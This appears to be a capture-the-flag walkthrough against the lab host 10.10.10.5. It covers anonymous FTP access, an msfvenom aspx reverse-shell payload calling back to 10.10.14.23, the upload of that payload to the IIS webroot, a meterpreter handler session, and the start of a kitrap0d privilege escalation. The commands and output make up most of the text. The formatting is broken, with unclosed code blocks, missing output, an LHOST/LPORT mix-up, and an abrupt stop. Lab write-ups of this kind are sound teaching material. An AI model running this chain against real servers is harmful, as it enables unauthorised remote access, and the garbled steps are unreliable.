# Information Gathering

## Nmap (Port Scan)

```bash
sudo nmap -A -T4 -p- 10.10.10.5
```

This was the initial nmap scan. The key things to note are:
>* ftp-anon: Anonymous FTP login allowed (FTP code 230)
>* Files accessible from Anonymous login
>* 80/tcp open  http    Microsoft IIS httpd 7.5

```bash

# Exploitation

## Downloading Files from Anonymous Login

```bash 
ftp 10.10.10.5
```

I connected to the machine via FTP using the credentials ```anonymous:anonymous``` and then downloaded the files available.

```bash
Connected to 10.10.10.5.

```

## Using Msfvenom to Create a Custom Reverse Shell

After looking through the files from the ftp transfer, there was nothing there that gave me any new information. It was simply a rabbit hole. So, I decided that I had to take another approach. I knew that the machine was using IIS to run its webpage, which in fact uses ```.aspx``` files, instead of say ```html```.

```bash
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.23 LPORT=4444 -f aspx -o wither.aspx

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of aspx file: 2796 bytes
Saved as: wither.aspx

ls

iisstart.htm  test.html  welcome.png  wither.aspx
```

## Transferring the Shell via FTP

Knowing that I can easily access the webroot directory via FTP, I then decided to upload my shell onto the webserver.

```bash
ftp> put wither.aspx
local: wither.aspx remote: wither.aspx
200 PORT command successful.
150 Opening ASCII mode data connection.
226 Transfer complete.
2832 bytes sent in 0.00 secs (32.5398 MB/s)
```

## Opening a Meterpreter Shell

With my shell on the webserver, I could then open a reverse tcp connection between my machine and the webserver. To do this, I used Metasploit's exploit handler ```multi/handler``` with the payload ```windows/meterpreter/reverse_tcp```. Once I had the shell, I set it to go to the background, so that I could use it in exploitation later on.

```bash
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > run

[-] Exploit failed: The following options failed to validate: LHOST.
[*] Exploit completed, but no session was created.
msf5 exploit(multi/handler) > set LHOST tun0
LHOSt => tun0
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.23:4444 
[*] Sending stage (176195 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.23:4444 -> 10.10.10.5:49160) at 2020-07-14 00:47:33 +0100

meterpreter > background
[*] Backgrounding session 1...
```

## Finding a Suggested Exploit

Now that I had a shell, it was time to exploit. To help me find a suitable exploit, I used Metasploit's ```local_exploit_suggester``` which scans for exploits using information that it can gather from the meterpreter session that I opened earlier.

```bash
msf5 exploit(multi/handler) > search suggest

## Executing the Exploit

I decided that I was going to use ```exploit/local/ms10_015_kitrap0d``` since it was the oldest, and thus hopefully the most reliable. Configuration of the module was pretty simple, all I had to do was set the ```TARGET``` to ```0``` (only available option), ```SESSION``` to ```1``` (my meterpreter session that I created earlier), ```LHOST``` to my adapter ```tun0``` (to use my IP on the VPN) and the ```LHOST``` to ```4445``` (not 4444 becuase we already had our meterpreter listener on that port).

```bash
msf5 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms10_015_kitrap0d
msf5 exploit(windows/local/ms10_015_kitrap0d) > options
